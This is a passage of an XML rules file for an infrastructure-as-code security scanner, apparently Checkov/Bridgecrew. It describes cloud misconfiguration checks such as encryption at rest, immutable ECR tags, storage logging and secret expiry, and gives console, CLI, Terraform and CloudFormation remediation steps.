<li>To enable encryption for a new Neptune DB instance, navigate to the <strong>Enable encryption</strong> section on the Neptune console and click <strong>Yes</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To creates a new Amazon Neptune DB cluster:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">create-db-cluster
    --db-cluster-identifier &lt;value&gt;
    --engine &lt;value&gt;
    --storage-encrypted true
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform </div><a aria-label="Skip link to Terraform " class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_neptune_cluster</li>
<li><strong>Arguments</strong>: storage_encrypted - (Optional) Specifies whether the Neptune cluster is encrypted. The default is false if not specified.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_neptune_cluster</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_neptune_cluster">resource "aws_neptune_cluster" "example" {
  ...
  cluster_identifier                  = "neptune-cluster-demo"
+ storage_encrypted                   = true
  ...
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation </div><a aria-label="Skip link to CloudFormation " class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::Neptune::DBCluster</li>
<li><strong>Arguments</strong>: Proprties.StorageEncrypted</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: "AWS::Neptune::DBCluster"
    Properties:
      ...
+     StorageEncrypted: true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/general_18' target='_blank'> https://docs.bridgecrew.io/docs/general_18</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/general_18' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_47</key>
    <name>Ensure DAX is securely encrypted at rest</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="dax-is-not-securely-encrypted-at-rest"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-dax-is-not-securely-encrypted-at-rest"></div>DAX is not securely encrypted at rest</div><a aria-label="Skip link to DAX is not securely encrypted at rest" class="heading-anchor-icon fa fa-anchor" href="#dax-is-not-securely-encrypted-at-rest"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon DynamoDB Accelerator (DAX) encryption at rest provides an additional layer of data protection, helping secure your data from unauthorized access to underlying storage.</p>
<p>With encryption at rest the data persisted by DAX on disk is encrypted using 256-bit Advanced Encryption Standard (AES-256). DAX writes data to disk as part of propagating changes from the primary node to read replicas. DAX encryption at rest automatically integrates with AWS KMS for managing the single service default key used to encrypt clusters. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <strong><a href="https://console.aws.amazon.com/dynamodb/" target="_self">Amazon DynamoDB console</a></strong>.</li>
<li>In the navigation pane on the left side of the console, under <strong>DAX</strong>, select <strong>Clusters</strong>.</li>
<li>Click <strong>Create Cluster</strong>.</li>
<li>For Cluster name, enter a short name for your cluster. Select the node type for all of the nodes in the cluster, and for the cluster size, use 3 nodes.</li>
<li>In Encryption, make sure that Enable encryption is selected.<br/>
7 After selecting the IAM role, subnet group, security groups, and cluster settings, select Launch cluster.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To creates a DAX cluster:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws dax create-cluster \
    --cluster-name daxcluster \
    --node-type dax.r4.large \
    --replication-factor 3 \
    --iam-role-arn roleARN  \
    --sse-specification Enabled=true
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_dax_cluster</li>
<li><strong>Arguments</strong>: server_side_encryption - (Optional) Encrypt at rest options, enabled/disabled. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_dax_cluster" "example" {
  ...
  cluster_name       = "cluster-example"
+ server_side_encryption = enabled
  ...
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::DAX::Cluster</li>
<li><strong>Arguments</strong>: Properties.SSESpecification.SSEEnabled - (Optional) Encrypt at rest options, enabled/disabled. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  daxCluster:
    Type: AWS::DAX::Cluster
    Properties:
      ...
+     SSESpecification:
+       SSEEnabled: true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_23' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_23</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_23' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_51</key>
    <name>Ensure ECR image tags are immutable</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="ecr-image-tags-are-not-immutable"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-ecr-image-tags-are-not-immutable"></div>ECR image tags are not immutable</div><a aria-label="Skip link to ECR image tags are not immutable" class="heading-anchor-icon fa fa-anchor" href="#ecr-image-tags-are-not-immutable"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon ECR supports immutable tags, preventing image tags from being overwritten. In the past, ECR tags could have been overwritten, this could be overcome by requiring users to uniquely identify an image using a naming convention.   </p>
<p>Tag Immutability enables users can rely on the descriptive tags of an image as a mechanism to track and uniquely identify images. By setting an image tag as immutable, developers can use the tag to correlate the deployed image version with the build that produced the image.  </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <strong><a href="https://console.aws.amazon.com/ecr/repositories" target="_self">Amazon ECR console</a></strong>.</li>
<li>Select a repository using the radio button.</li>
<li>Click <strong>Edit</strong>.</li>
<li>Enable the <strong>Tag immutability</strong> toggle.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To create a repository with immutable tags configured:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws ecr create-repository
--repository-name name
--image-tag-mutability IMMUTABLE
--region us-east-2
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_ecr_repository</li>
<li><strong>Arguments</strong>: image_tag_mutability - (Optional) The tag mutability setting for the repository. Must be one of: MUTABLE or IMMUTABLE. Defaults to MUTABLE. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_ecr_repository" "example" {
  ...
  name                 = "bar"
+ image_tag_mutability = "IMMUTABLE"
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::ECR::Repository</li>
<li><strong>Arguments</strong>: Properties.ImageTagMutability - (Optional) The tag mutability setting for the repository. Must be one of: MUTABLE or IMMUTABLE. Defaults to MUTABLE. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources: 
  MyRepository: 
    Type: AWS::ECR::Repository
    Properties: 
      ...
+     ImageTagMutability: "IMMUTABLE"
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_24' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_24</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_24' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AZURE_21</key>
    <name>Ensure Azure storage account logging for blobs is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-storage-account-logging-for-blobs-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-storage-account-logging-for-blobs-is-disabled"></div>Azure storage account logging for blobs is disabled</div><a aria-label="Skip link to Azure storage account logging for blobs is disabled" class="heading-anchor-icon fa fa-anchor" href="#azure-storage-account-logging-for-blobs-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Storage Blob service provides scalable, cost-efficient objective storage in the cloud. Storage Logging happens server-side and allows details for both successful and failed requests to be recorded in the storage account. These logs allow users to see the details of read, write, and delete operations against the blobs. Storage Logging log entries contain the following information about individual requests: Timing information such as start time, end-to-end latency, and server latency, authentication details , concurrency information and the sizes of the request and response messages.<br/>
Storage Analytics logs contain detailed information about successful and failed requests to a storage service. This information can be used to monitor individual requests and to diagnose issues with a storage service. Requests are logged on a best-effort basis.<br/>
We recommend that you ensure Storage Logging is enabled for Blob Service for Read Requests</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_resource_group, azurerm_log_analytics_workspace, azurerm_storage_account, azurerm_log_analytics_storage_insights,azurerm_storage_container</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_resource_group" "resource_group_ok" {
  name     = "example-resources"
  location = "West Europe"
}

resource "azurerm_log_analytics_workspace" "analytics_workspace_ok" {
  name                = "exampleworkspace"
  location            = azurerm_resource_group.resource_group_ok.location
  resource_group_name = azurerm_resource_group.resource_group_ok.name
  sku                 = "PerGB2018"
  retention_in_days   = 30
}

resource "azurerm_storage_account" "storage_account_ok" {
  name                     = "examplestoracc"
  resource_group_name      = azurerm_resource_group.resource_group_ok.name
  location                 = azurerm_resource_group.resource_group_ok.location
  account_tier             = "Standard"
  account_replication_type = "LRS"
}

resource "azurerm_log_analytics_storage_insights" "analytics_storage_insights_ok" {
  name                = "example-storageinsightconfig"
  resource_group_name = azurerm_resource_group.resource_group_ok.name
  workspace_id        = azurerm_log_analytics_workspace.analytics_workspace_ok.id

  storage_account_id  = azurerm_storage_account.storage_account_ok.id
  storage_account_key = azurerm_storage_account.storage_account_ok.primary_access_key
  blob_container_names= ["blobExample_ok"]
}

resource "azurerm_storage_container" "storage_container_ok" {
  name                   = "my-awesome-content.zip"
  storage_account_name   = azurerm_storage_account.storage_account_ok.name
  storage_container_name = azurerm_storage_container.storage_container_ok.name
  container_access_type  = "blob"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-storage-logging-is-enabled-for-blob-service-for-read-requests' target='_blank'> https://docs.bridgecrew.io/docs/ensure-storage-logging-is-enabled-for-blob-service-for-read-requests</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-storage-logging-is-enabled-for-blob-service-for-read-requests' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_29</key>
    <name>Ensure GCP cloud storage bucket with uniform bucket-level access are enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-cloud-storage-bucket-with-uniform-bucket-level-access-are-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-cloud-storage-bucket-with-uniform-bucket-level-access-are-disabled"></div>GCP cloud storage bucket with uniform bucket-level access are disabled</div><a aria-label="Skip link to GCP cloud storage bucket with uniform bucket-level access are disabled" class="heading-anchor-icon fa fa-anchor" href="#gcp-cloud-storage-bucket-with-uniform-bucket-level-access-are-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>For a user to access a Cloud Storage resource only one of the systems needs to grant the user permission. Cloud IAM is used throughout Google Cloud and allows you to grant a variety of permissions at bucket and project levels. ACLs have limited permission options, are used only by Cloud Storage, and allow you to grant permissions on a per-object basis.</p>
<p>Cloud Storage has uniform bucket-level access that supports a uniform permissioning system. Using this feature disables ACLs for all Cloud Storage resources. Access to Cloud Storage resources is granted exclusively through Cloud IAM. Enabling uniform bucket-level access guarantees that if a Storage bucket is not publicly accessible, no object in the bucket is publicly accessible.</p>
<p>We recommend you enable uniform bucket-level access on Cloud Storage buckets. Uniform bucket-level access is used to unify and simplify how you grant access to your Cloud Storage resources. Cloud Storage offers two systems that act in parallel for granting users permission to access your buckets and objects: </p>
<ul>
<li>Cloud Identity and Access Management (Cloud IAM)</li>
<li>Access Control Lists (ACLs). </li>
</ul>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/storage/browser" target="_self">Cloud Storage</a>.</li>
<li>From the <strong>list of buckets</strong>, select the name of the desired bucket.</li>
<li>Near the top of the page, click the <strong>Permissions</strong> tab.</li>
<li>In the text box that begins <strong>This bucket uses fine-grained access control</strong>, click <strong>Edit</strong>.</li>
<li>A pop-up menu opens. Select <strong>Uniform</strong>.</li>
<li>Click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>Set the option to on for uniformbucketlevelaccess, using the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gsutil uniformbucketlevelaccess set on gs://BUCKET_NAME/</code></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_storage_bucket</li>
<li><strong>Argument</strong>: uniform_bucket_level_access is set to true,</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_storage_bucket" "examplea" {
    name     = "terragoat-${var.environment}"
    bucket_policy_only = true
 +   uniform_bucket_level_access = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_gcs_2' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_gcs_2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_gcs_2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_45</key>
    <name>Ensure AKV secrets have an expiration date set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="akv-secrets-do-not-have-an-expiration-date-set"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-akv-secrets-do-not-have-an-expiration-date-set"></div>AKV secrets do not have an expiration date set </div><a aria-label="Skip link to AKV secrets do not have an expiration date set " class="heading-anchor-icon fa fa-anchor" href="#akv-secrets-do-not-have-an-expiration-date-set"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Azure Key Vault (AKV) enables users to store and keep secrets within the Microsoft Azure environment. Secrets in the AKV are octet sequences with a maximum size of 25k bytes each.<br/>
The exp (expiration time) attribute identifies the expiration time on or after which the secret must not be used. By default, secrets do not expire. </p>
<p>We recommend you rotate secrets in the key vault and set an explicit expiration time for all secrets. This ensures that the secrets cannot be used beyond their assigned lifetimes.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to <strong>Key vaults</strong>.</li>
<li>For each Key vault:<br/>
a) Click <strong>Secrets</strong>.<br/>
b) Navigate to <strong>Settings</strong>.<br/>
c) Set <strong>Enabled?</strong> to <strong>Yes</strong>.<br/>
d) Set an appropriate <strong>EXPIRATION DATE</strong> on all secrets.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To set an <strong>EXPIRATION DATE</strong> on all secrets, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az keyvault secret set-attributes 
--name &lt;secretName&gt; 
--vault-name &lt;vaultName&gt; 
--expires Y-m-d'T'H:M:S'Z'
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform </div><a aria-label="Skip link to Terraform " class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_key_vault_secret</li>
<li><strong>Argument</strong>: expiration_date</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_key_vault_secret" "example" {
     ...
 +   expiration_date = "2020-12-30T20:00:00Z"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/set-an-expiration-date-on-all-secrets' target='_blank'> https://docs.bridgecrew.io/docs/set-an-expiration-date-on-all-secrets</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/set-an-expiration-date-on-all-secrets' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_73</key>
    <name>Ensure API Gateway has X-Ray tracing enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="api-gateway-does-not-have-x-ray-tracing-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-api-gateway-does-not-have-x-ray-tracing-enabled"></div>API Gateway does not have X-Ray tracing enabled</div><a aria-label="Skip link to API Gateway does not have X-Ray tracing enabled" class="heading-anchor-icon fa fa-anchor" href="#api-gateway-does-not-have-x-ray-tracing-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>When an API Gateway stage has the active tracing feature enabled, Amazon API Gateway service automatically samples API invocation requests based on the sampling algorithm specified by AWS X-Ray.</p>
<p>With tracing enabled X-Ray can provide an end-to-end view of an entire HTTP request. You can use this to analyze latencies in APIs and their backend services.</p>
